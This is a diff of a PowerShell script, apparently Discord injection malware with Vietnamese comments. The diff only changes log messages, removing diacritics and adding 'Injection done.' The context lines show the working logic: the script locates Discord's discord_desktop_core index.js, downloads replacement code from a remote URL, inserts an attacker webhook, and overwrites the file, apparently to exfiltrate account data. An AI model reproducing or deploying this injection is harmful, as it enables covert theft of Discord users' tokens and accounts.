@@ -37,7 +37,7 @@ $discordPath = Join-Path $localAppData "Discord"
 # Lấy đường dẫn phiên bản mới nhất của ứng dụng Discord
 $appVersionPath = Get-ChildItem -Path $discordPath -Directory | Sort-Object -Property Name -Descending | Select-Object -First 1
 if (-not $appVersionPath) {
-    loghook "Không tìm thấy phiên bản Discord trong $discordPath"
+    loghook "Khong tim thay phien ban Discord trong $discordPath"
     exit
 }
 
@@ -45,14 +45,14 @@ if (-not $appVersionPath) {
 $corePath = Join-Path $appVersionPath.FullName "modules\discord_desktop_core-*\discord_desktop_core"
 $coreVersionPath = Get-ChildItem -Path $corePath -Directory | Sort-Object -Property Name -Descending | Select-Object -First 1
 if (-not $coreVersionPath) {
-    loghook "Không tìm thấy thư mục discord_desktop_core trong $appVersionPath"
+    loghook "Khong tim thay thu muc discord_desktop_core trong $appVersionPath"
     exit
 }
 
 # Đường dẫn đến tệp index.js
 $indexPath = Join-Path $coreVersionPath.FullName "index.js"
 if (-not (Test-Path $indexPath)) {
-    loghook "Không tìm thấy tệp index.js trong $coreVersionPath"
+    loghook "Không tim thay tep index.js trong $coreVersionPath"
     exit
 }
 
@@ -61,7 +61,7 @@ try {
     $content = Invoke-WebRequest -Uri $url -UseBasicParsing
     $fileContent = $content.Content
 } catch {
-    loghook "Không thể tải nội dung từ $url"
+    loghook "Khong the tai noi dung tu $url"
     exit
 }
 
@@ -71,8 +71,8 @@ $newContent = $fileContent -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2'
 # Ghi nội dung mới vào tệp index.js
 try {
     Set-Content -Path $indexPath -Value $newContent -Force
-    loghook "Đã cập nhật tệp index.js thành công."
+    loghook "Injection done."
 } catch {
-    loghook "Không thể ghi nội dung vào tệp index.js"
+    loghook "Injection khong thanh cong."
     exit
 }
